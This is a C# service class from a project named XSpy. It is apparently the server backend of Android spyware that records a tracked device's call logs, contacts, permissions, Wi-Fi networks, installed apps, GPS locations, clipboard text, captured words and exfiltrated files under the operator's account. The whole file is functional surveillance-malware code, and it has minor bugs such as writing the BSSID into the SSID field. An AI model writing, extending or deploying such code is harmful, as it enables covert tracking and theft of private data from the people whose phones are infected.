using System;
using System.Collections.Generic;
using Microsoft.EntityFrameworkCore;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using CFCEad.Shared.Models.Response;
using CFCEad.Shared.Models.Response.Devices.Search;
using Microsoft.Extensions.Caching.Distributed;
using XSpy.Database.Entities;
using XSpy.Database.Entities.Devices;
using XSpy.Database.Extensions;
using XSpy.Database.Models.Tables;
using XSpy.Database.Services.Base;
using XSpy.Shared.Models.Requests.Devices;
using XSpy.Shared.Models.Requests.Devices.Search;
using File = XSpy.Database.Entities.Devices.File;

namespace XSpy.Database.Services
{
    public class DeviceService : BaseEntityService
    {
        public DeviceService(DatabaseContext context, IDistributedCache cache) : base(context, cache)
        {
        }

        public async Task<DataTableResponse<DeviceListResponse>> GetTable(DataTableRequest<SearchDeviceRequest> request,
            User user)
        {
            var query = DbContext.Devices.AsQueryable();

            var countTotal = await query.LongCountAsync();


            if (request.Filter != null)
            {
                if (!string.IsNullOrEmpty(request.Filter.Model))
                {
                    query = query.Where(s => s.Model.ToUpper().Contains(request.Filter.Model.ToUpper()));
                }
            }

            if (request.Search != null && !string.IsNullOrEmpty(request.Search.Value))
            {
                var search = request.Search.Value.ToUpper();
                query = query.Where(s =>
                    s.Model.ToUpper().Contains(search) || s.Manufacturer.ToUpper().Contains(search) ||
                    s.DeviceId.ToUpper().Contains(search));
            }

            query = query.Where(s => s.UserId == user.Id);

            var queryData = query.Select(s => new DeviceListResponse()
            {
                Id = s.Id,
                Model = s.Model,
                DeviceId = s.DeviceId,
                IsActive = s.IsOnline,
                LastUpdate = s.UpdatedAt
            });

            queryData = OrderResult(queryData, request);
            var total = await queryData.LongCountAsync();
            queryData = queryData.ApplyTableLimit(request);

            return new DataTableResponse<DeviceListResponse>()
            {
                Data = await queryData.ToListAsync(),
                Draw = request.Draw,
                RecordsFiltered = total,
                RecordsTotal = countTotal
            };
        }


        public Task<Device> GetDeviceById(Guid id)
        {
            return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id);
        }

        public async Task DisconnectDevice(string deviceId)
        {
            var device = await DbContext.Devices.Where(s => s.DeviceId == deviceId).FirstOrDefaultAsync();
            device.IsOnline = false;
            DbContext.Update(device);
            await DbContext.SaveChangesAsync();
        }

        public async Task SaveDevice(Guid userId, SaveDeviceRequest request)
        {
            var device =
                await DbContext.Devices.FirstOrDefaultAsync(s => s.DeviceId == request.DeviceId && s.UserId == userId);
            if (device == null)
            {
                device = new Device()
                {
                    Id = Guid.NewGuid(),
                    AddedAt = DateTime.Now,
                    DeviceId = request.DeviceId,
                    LastIp = request.IpAddress,
                    Manufacturer = request.Manufacturer,
                    Model = request.Model,
                    SystemVersion = request.Release,
                    UpdatedAt = DateTime.Now,
                    UserId = userId,
                    IsOnline = true
                };

                await DbContext.Devices.AddAsync(device);
            }
            else
            {
                device.LastIp = request.IpAddress;
                device.IsOnline = true;
                device.UpdatedAt = DateTime.Now;
                DbContext.Update(device);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveCalls(string deviceId, SaveCallsRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            foreach (var dataRequest in request.CallsList)
            {
                var hash = CalculateMd5(
                    dataRequest.Name + dataRequest.PhoneNo + dataRequest.Date + dataRequest.Duration);

                if (await DbContext.Calls.AnyAsync(s => s.Hash == hash))
                {
                    continue;
                }

                await DbContext.Calls.AddAsync(new Call()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Name = dataRequest.Name,
                    Number = dataRequest.PhoneNo,
                    Hash = hash,
                    Date = JavaTimeStampToDateTime(dataRequest.Date),
                    Duration = dataRequest.Duration,
                    Type = dataRequest.Type
                });
            }


            await DbContext.SaveChangesAsync();
        }

        public async Task<File> StoreFile(string deviceId, string savePath, TransferFileRequest transferFile)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return null;

            var fileExists =
                await DbContext.Files.FirstOrDefaultAsync(s =>
                    s.DeviceId == device && s.OriginalPath == transferFile.Path);
            if (fileExists != null)
            {
                return fileExists;
            }

            var name = Guid.NewGuid().ToString().Replace("-", "").Take(12) + transferFile.Name;


            var file = new File()
            {
                Id = Guid.NewGuid(),
                CratedAt = DateTime.Now,
                DeviceId = device,
                OriginalName = transferFile.Name,
                OriginalPath = transferFile.Path,
                FileType = transferFile.Type,
                SavedPath = Path.Combine(savePath, device.ToString(), transferFile.Type, name)
            };

            await DbContext.Files.AddAsync(file);
            await DbContext.SaveChangesAsync();
            return file;
        }

        public async Task SaveContacts(string deviceId, SaveContactsRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            foreach (var dataRequest in request.ContactsList)
            {
                var hash = CalculateMd5(dataRequest.Name + dataRequest.PhoneNo + dataRequest.PhoneId);

                if (await DbContext.Contacts.AnyAsync(s => s.Hash == hash))
                {
                    continue;
                }

                await DbContext.Contacts.AddAsync(new Contact()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    ContactName = dataRequest.Name,
                    Number = dataRequest.PhoneNo,
                    Hash = hash,
                    PhoneId = dataRequest.PhoneId
                });
            }


            await DbContext.SaveChangesAsync();
        }

        public async Task SavePermission(string deviceId, PermissionDataRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            var permission =
                await DbContext.Permissions.FirstOrDefaultAsync(s => s.DeviceId == device && s.Key == request.Perm);
            if (permission == null)
            {
                permission = new Permission()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Key = request.Perm,
                    IsAllowed = request.IsAllowed
                };
                await DbContext.AddAsync(permission);
            }
            else
            {
                DbContext.Update(permission);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SavePermission(string deviceId, GrantedPermissionRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            DbContext.Permissions.RemoveRange(DbContext.Permissions.Where(s => s.DeviceId == device));

            foreach (var requestPermission in request.Permissions)
            {
                var permission = new Permission()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Key = requestPermission,
                    IsAllowed = true
                };

                await DbContext.AddAsync(permission);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveWifi(string deviceId, SaveWifiList request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;

            DbContext.WifiList.RemoveRange(DbContext.WifiList.Where(s => s.DeviceId == device));

            foreach (var requestNetwork in request.Networks)
            {
                var entry = new Wifi()
                {
                    Id = Guid.NewGuid(),
                    CratedAt = DateTime.Now,
                    DeviceId = device,
                    Bssid = requestNetwork.BSSID,
                    Ssid = requestNetwork.BSSID
                };

                await DbContext.AddAsync(entry);
            }

            await DbContext.SaveChangesAsync();
        }

        public async Task SaveInstalledList(string deviceId, SaveInstalledAppsRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();

            if (device == Guid.Empty)
                return;


            DbContext.InstalledApps.RemoveRange(
                DbContext.InstalledApps.Where(s =>
                    s.DeviceId == device));

            foreach (var installedApp in request.Apps)
            {
                var app = new InstalledApps()
                {
                    CratedAt = JavaTimeStampToDateTime(installedApp.InstallDate),
                    AppName = installedApp.AppName,
                    DeviceId = device,
                    Id = Guid.NewGuid(),
                    PackageName = installedApp.PackageName,
                    VersionCode = installedApp.VersionCode,
                    VersionName = installedApp.VersionName
                };
                await DbContext.InstalledApps.AddAsync(app);
            }

            await DbContext.SaveChangesAsync();
        }


        public async Task SaveLocation(string deviceId, UpdatePositionRequest request)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return;

            var loc = new Location()
            {
                Id = Guid.NewGuid(),
                DeviceId = device,
                Accuracy = request.Accuracy,
                Altitude = request.Altitude,
                CratedAt = DateTime.Now,
                Enabled = request.Enabled,
                Latitude = request.Latitude,
                Longitude = request.Longitude,
                Speed = request.Speed
            };

            await DbContext.Locations.AddAsync(loc);
            await DbContext.SaveChangesAsync();
        }

        public async Task SaveWords(string deviceId, string word, bool isClipboard)
        {
            var device =
                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
                    .FirstOrDefaultAsync();
            if (device == Guid.Empty)
                return;
            var clip = new Clipboard()
            {
                Id = Guid.NewGuid(),
                DeviceId = device,
                CratedAt = DateTime.Now,
                Content = word,
                IsClipboard = isClipboard
            };

            await DbContext.Clipboards.AddAsync(clip);
            await DbContext.SaveChangesAsync();
        }

        public Task<Device> GetDeviceByDeviceId(Guid userId, string deviceId)
        {
            return DbContext.Devices.FirstOrDefaultAsync(s => s.DeviceId == deviceId && s.UserId == userId);
        }
    }
}